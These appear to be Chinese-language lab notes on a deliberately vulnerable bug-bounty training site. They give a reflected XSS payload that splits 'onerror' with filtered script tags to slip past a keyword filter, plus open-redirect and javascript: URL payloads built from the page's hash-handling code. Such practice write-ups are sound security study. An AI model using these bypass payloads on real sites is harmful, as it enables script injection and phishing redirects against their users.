该靶场有好几个xss，还有越权
目前找到一个xss
# xss1
主页点击login并且填入账号密码，burp抓到包?act=login
发现login是反射点
尝试?act=xxx
![[Pasted image 20240910091543.png]]
尝试`<img src=1 onerror=alert() >`
发现on+字符会置空，还有script标签也会置空
经过一小时尝试
payload：
```
https://www.bugbountytraining.com/fastfoodhackings/index.php?act=xxx--%3E%3Cimg%20src=1%20o%3Cscript%3Ener%3Cscript%3Eror=alert()%3E\\
```
在on之间插入置空的<script>

# 页面跳转
阅读页面源代码，直接筛选.js关键字，发现主页最下面的一个js文件，以下是他的代码
```
	const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);

window.addEventListener('load', function() {
const redirectUrl = urlParams.get('from');
const redirectType = urlParams.get('type');
if (redirectUrl === null) { 
    // No redirect.
} else {
	if (redirectType == '1') {
		window.location.href=getHashValue("redir");
	} else {
    document.getElementById("returnurl").style.display="block";
    document.getElementById("redirectUrl").href=redirectUrl;
    document.cookie = "from="+redirectUrl+"; expires=Thu, 20 Dec 2021 12:00:00 UTC";
}
}
});

/* new code, added by snowyslittlehelper on 14/12/2020 */

function getHashValue(key) 
{
    var matches = location.hash.match(new RegExp(key+'=([^&]*)'));
    return matches ? matches[1] : null;
}
```
于是我们构造payload：
```
https://www.bugbountytraining.com/fastfoodhackings/index.php?from=1&type=1#redir=https://baidu.com
```
以及
```
https://www.bugbountytraining.com/fastfoodhackings/index.php?from=1&type=1#redir=javascript:alert()
```